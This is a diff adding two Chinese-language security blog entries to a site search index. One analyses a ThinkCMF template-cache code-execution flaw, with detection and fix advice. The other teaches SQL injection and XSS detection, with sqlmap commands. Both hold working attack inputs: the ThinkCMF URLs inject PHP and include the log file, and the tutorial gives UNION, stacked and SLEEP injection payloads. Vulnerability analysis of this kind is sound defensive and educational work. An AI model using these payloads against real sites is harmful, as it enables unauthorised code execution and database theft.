@@ -103,5 +103,55 @@
   
   
   
+  <entry>
+    <title>ThinkCMF 模板缓存漏洞分析</title>
+    <link href="/2020/04/26/ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <url>/2020/04/26/ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    
+    <content type="html"><![CDATA[<h1 id="ThinkCMF-模板缓存漏洞分析"><a href="#ThinkCMF-模板缓存漏洞分析" class="headerlink" title="ThinkCMF 模板缓存漏洞分析"></a>ThinkCMF 模板缓存漏洞分析</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p>参考：<a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a></p><p>ThinkCMF是一款开源内容管理框架。ThinkCMF2.x 基于了 thinkphp3.x 开发，默认情况下开启了报错日志，并且开启了模板缓存。当ThinkCMF加载一个不存在的模板时，会将报错信息输出到 data/runtime/Logs/Portal 目录下的日志文件中。因此将恶意代码以模板的形式，让ThinkCMF加载，然后包含日志文件后，即可执行任意代码。<br>目前已知ThinkCMF 1.6.0、2.1.0、2.2.0、2.2.1、2.2.2、2.2.3 均存在该漏洞。</p><h2 id="二、漏洞环境"><a href="#二、漏洞环境" class="headerlink" title="二、漏洞环境"></a>二、漏洞环境</h2><p>下载：ThinkCMF 2.2.3<br>链接：<a href="https://pan.baidu.com/s/14GtMXaNK8DaTdL78S6ESdg">https://pan.baidu.com/s/14GtMXaNK8DaTdL78S6ESdg</a> 提取码：i0vy<br>解压后将整个文件夹放到phpstudy的WWW目录下。然后访问 /ThinkCMFX/ 会跳到ThinkCMF安装向导，ThinkCMF会很人性化的一键配置（phpstudy mysql默认密码为root）。<br><img src="https://p1.ssl.qhimg.com/t01c5cf4a89af124f3a.png"></p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>该版本的display方法是public的。</p><p>因此通过构造a参数的display方法，让ThinkCMF加载我们提供的“模板”。</p><p><a href="http://localhost/ThinkCMFX/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27inject.php%27,%27%3C?php%20echo(%22injected%22);?%3E%27);die();?%3E">http://localhost/ThinkCMFX/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27inject.php%27,%27%3C?php%20echo(%22injected%22);?%3E%27);die();?%3E</a></p><p>代码很简单，生成一个inject.php文件，内容是打印injected。<br><img src="https://p3.ssl.qhimg.com/t019a6e934f4a1adbff.png"><br>记录报错日志文件格式为YY_MM_DD.log，如当前日期为2020年5月13日，日志文件为20_05_13.log。<br>然后包含该日志文件：</p><p><a href="http://localhost/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/20_05_13.log">http://localhost/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/20_05_13.log</a></p><p><img src="https://p4.ssl.qhimg.com/t0100b207382975852b.png"></p><p>此时在web根目录下已经生成了inject.php。<img src="https://p0.ssl.qhimg.com/t01dd000fba6524d2a8.png"></p><h2 id="四、漏洞检测"><a href="#四、漏洞检测" class="headerlink" title="四、漏洞检测"></a>四、漏洞检测</h2><p>1.可检测display/fetch等函数是否为public；<br>2.检测?a=display&amp;templateFile=”aaa”的response body中是否包含“模板不存在”字样。</p><h2 id="五、修复方案"><a href="#五、修复方案" class="headerlink" title="五、修复方案"></a>五、修复方案</h2><p>1.升级版本<br>2.临时方案：可将 HomebaseController.class.php 和 AdminbaseController.class.php类中display和fetch函数由public改为protected。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞分析</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sqli &amp; xss</title>
+    <link href="/2018/12/05/sqli-xss/"/>
+    <url>/2018/12/05/sqli-xss/</url>
+    
+    <content type="html"><![CDATA[<h1 id="sqli-amp-xss"><a href="#sqli-amp-xss" class="headerlink" title="sqli &amp; xss"></a>sqli &amp; xss</h1><h2 id="一、sqli"><a href="#一、sqli" class="headerlink" title="一、sqli"></a>一、sqli</h2><h3 id="1-1-原理与危害"><a href="#1-1-原理与危害" class="headerlink" title="1.1 原理与危害"></a>1.1 原理与危害</h3><pre><code>sql注入是将恶意的sql查询或者语句添加到应用的输入参数中，然后在后台的服务器数据库上解析执行进行攻击，如果用户输入恶意sql查询代码，web应用又没有对输入的sql查询进行审查，就会出现该漏洞。危害：</code></pre><ol><li><p>猜解后台数据库，这是最常见的情况，窃取大量数据库敏感数据</p></li><li><p>借助数据库进行提权</p></li><li><p>绕过验证直接登录</p></li></ol><h3 id="1-2-手工判断注入点"><a href="#1-2-手工判断注入点" class="headerlink" title="1.2 手工判断注入点"></a>1.2 手工判断注入点</h3><p>**关键点：让查询条件闭合，以下均为简单示例，实际场景中除了闭合引号，还可能存在括号等 **</p><ul><li><p>初步探测：</p><ul><li><p>加入单引号 ‘ 提交，如果报错，则该网站可能就存在注入漏洞。</p></li><li><p>加入双引号 “ 提交，如果报错，则该网站可能就存在注入漏洞。</p></li><li><p>如果单引号报错，双引号不报错；或者单引号不报错，双引号报错，说明存在注入漏洞。</p></li></ul></li></ul><ul><li><p>数字型sql注入探测：</p><p><code>select user from users where id = 1</code></p><ul><li><p>方法1：尝试 news.asp?id=123 and 1=1 和 news.asp?id=123 and 1=2 返回不同的页面,说明存在注入漏洞。（分析：and前后语句有一个为假则整个查询条件为假，因此and 1=1 返回正常页面，and 1=2 时会查询错误或不返回记录。）</p></li><li><p>方法2：尝试 news.asp?id=123 or 2&gt;1  和 news.asp?id=123 or 1&gt;2 返回不同的页面,说明存在注入漏洞。（分析：or前后语句有一个为真则整个查询条件为真，or 1=1 永真条件返回所有记录，or 1=2 返回原来相同的结果）</p></li><li><p>方法3：尝试对注入点进行 -1 和 -0。例如 news.asp?id=123-0 和 news.asp?id=123-1 如果返回不同的页面，说明存在注入漏洞。（分析：123-0时返回原来相同的结果，如果123-1时返回其他页面或页面没找到，表示存在注入漏洞。）</p></li></ul></li></ul><ul><li><p>字符型sql注入探测：</p><p><code>select user from users where id = &#39;1&#39;</code></p><ul><li><p>方法1：news.asp?id=123’ and ‘1’=’1 and  news.asp?id=123’ and ‘1’=’2 分别返回不同的页面,说明存在注入漏洞。（分析：加入’ and ‘1’=’1返回正确页面，and ‘1’=’2 返回查询记录或不返回记录，说明有注入漏洞。）</p></li><li><p>或将上述语句’ 换成双引号</p></li><li><p>其他方法可类比数字型，将数字型转为字符型</p></li></ul></li></ul><ul><li>表单提交/搜索框时，还可以通过通配符判断。例如先搜索 ‘，如果出错，然后搜索%，如果正常返回，说明存在注入漏洞。</li></ul><ul><li><p>报错形式：</p><ul><li>数据库查询错误直接回显在页面上</li><li>错误隐藏在页面源代码中</li><li>检测到错误跳转到另一个页面</li><li>返回HTTP错误代码500或重定向302</li><li>适当处理错误结果，显示一个通用错误页面</li></ul></li></ul><h3 id="1-3-使用sqlmap"><a href="#1-3-使用sqlmap" class="headerlink" title="1.3 使用sqlmap"></a>1.3 使用sqlmap</h3><h4 id="1-3-1-中文手册"><a href="#1-3-1-中文手册" class="headerlink" title="1.3.1 中文手册"></a>1.3.1 中文手册</h4><pre><code>https://parrotsec-cn.org/t/topic/834</code></pre><h4 id="1-3-2-sqlmap探测分类"><a href="#1-3-2-sqlmap探测分类" class="headerlink" title="1.3.2 sqlmap探测分类"></a>1.3.2 sqlmap探测分类</h4><ul><li><p>B: Boolean-based blind SQL injection（布尔型盲注）</p><p>通过判断页面返回情况获得想要的信息，比如数据库版本。<br>id=1’ and select(substring(version(),1,1))=5 #<br>id=1’ and length(database())&gt;1 #</p></li></ul><ul><li><p>E: Error-based SQL injection（报错型注入）</p><p>id=1’ and/**/extractvalue(1,concat(char(126),md5(1274754846)))and’<br>当然如果报错的数据不能回显，就无法使用报错注入，这时候我们就可以考虑是否存在盲注。</p></li></ul><ul><li><p>U: UNION query SQL injection（联合查询注入）</p><p><a href="http://hello.com/view?id=1">http://hello.com/view?id=1</a> UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM INFORMATION_SCHEMA.SCHEMATA</p></li></ul><ul><li><p>S: Stacked queries SQL injection（可多语句查询注入）</p><p><a href="http://hello.com/view?id=1;update">http://hello.com/view?id=1;update</a> t1 set content = ‘aaaaaaaaa’    </p></li></ul><ul><li><p>T: Time-based blind SQL injection（时间型盲注）</p><p><a href="http://hello.com/view?q=abc&#39;">http://hello.com/view?q=abc&#39;</a> AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = ‘<br>返回时间应该 &gt;= 5s，要考虑网络延迟。</p></li></ul><h4 id="1-3-3-POST请求场景"><a href="#1-3-3-POST请求场景" class="headerlink" title="1.3.3 POST请求场景"></a>1.3.3 POST请求场景</h4><ol><li>表单</li></ol><p>url:</p><pre><code>http://x.x.x.x/CAS/login;jsessionid=210B6748C19502F7B11B46AE0395061F?service=http%3A%2F%2Fwww.cqdcyl.cn%3A80%2Fmanager%2F?_eventId=submit&amp;checkCode=vsd&amp;execution=e1s1&amp;lt=LT-7429992-Nfq75vnkHQdavQoEcfVxbJV0Zsi9rt&amp;username=8&amp;password=8:select8</code></pre><p>cmd:</p><pre><code>python3 sqlmap.py -u https://x.x.x.x/index/more_goods_list.html --method=post --data=&#39;keyword=1&amp;__hash__=ef68966cb9753eb6e09c5f4a4847be1d_cd750e8d572395c1b439ed6fd2fa9497&#39;</code></pre><ol start="2"><li><p>json</p><p>sqlmap.py -u ‘<a href="http://localhost/sqltest.php&#39;">http://localhost/sqltest.php&#39;</a> –data=’{“id”:”1”}’</p></li><li><p>抓包读文件：抓包后使用 -r sqlmap会自动识别post参数</p><p>burp抓包后 copy to file </p></li></ol><p>cmd</p><pre><code>sqlmap.py -r &quot;filepath&quot; -p keyword* -r 参数：读文件 -p 指定检测的参数</code></pre><h4 id="1-3-4-GET请求场景"><a href="#1-3-4-GET请求场景" class="headerlink" title="1.3.4 GET请求场景"></a>1.3.4 GET请求场景</h4><p>url：</p><pre><code>http://x.x.x.x/proview.asp?lm=2&amp;id=198</code></pre><p>cmd:</p><pre><code>python3 sqlmap.py -u http://x.x.x.x/proview.asp?lm=2&amp;id=198</code></pre><h2 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h2><h3 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h3><pre><code>往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。</code></pre><h3 id="2-2-检测原理"><a href="#2-2-检测原理" class="headerlink" title="2.2 检测原理"></a>2.2 检测原理</h3><ul><li>发送随机字符</li><li>确认参数回显</li><li>通过html/js解析确认回显位置</li><li>根据回显的上下文发送不同的payload进行测试</li><li>使用html，js语法树解析是否多出来标签，属性，js语句等来确定是否执行成功</li></ul><h3 id="2-3-注意事项"><a href="#2-3-注意事项" class="headerlink" title="2.3 注意事项"></a>2.3 注意事项</h3><ul><li>payload可能有多种原因无法直接回显（弹窗），所以建议去查看响应的DOM树（F12开发者模式-elements），看是否多出来标签/属性/js语句。</li><li>chrome 内置 CSP，因此想直接回显的话建议使用firefox。</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞分析</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
   
 </search>
